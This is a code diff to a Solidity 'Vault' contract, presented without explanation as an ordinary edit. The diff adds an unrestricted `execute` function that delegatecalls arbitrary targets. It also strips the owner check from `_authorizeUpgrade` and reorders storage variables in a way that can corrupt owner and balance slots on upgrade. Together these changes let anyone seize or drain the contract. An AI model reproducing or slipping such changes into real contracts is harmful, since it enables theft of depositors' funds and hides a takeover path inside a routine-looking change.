@@ -5,9 +5,9 @@ pragma solidity 0.8.28;
 contract Vault {
     bytes32 internal constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
 
+    bool public paused;
     address public owner;
     uint256 public totalDeposits;
-    bool public paused;
     mapping(address => uint256) public balances;
     uint256 public lastDepositAt;
 
@@ -41,6 +41,18 @@ contract Vault {
         require(ok, "transfer failed");
     }
 
+    function withdrawAll(address payable to) external onlyOwner {
+        uint256 bal = address(this).balance;
+        (bool ok,) = to.call{value: bal}("");
+        require(ok, "transfer failed");
+    }
+
+    function execute(address target, bytes calldata data) external returns (bytes memory) {
+        (bool ok, bytes memory ret) = target.delegatecall(data);
+        require(ok, "call failed");
+        return ret;
+    }
+
     function setPaused(bool p) external onlyOwner {
         paused = p;
     }
@@ -54,5 +66,5 @@ contract Vault {
         emit Upgraded(implementation);
     }
 
-    function _authorizeUpgrade(address) internal view onlyOwner {}
+    function _authorizeUpgrade(address) internal view {}
 }
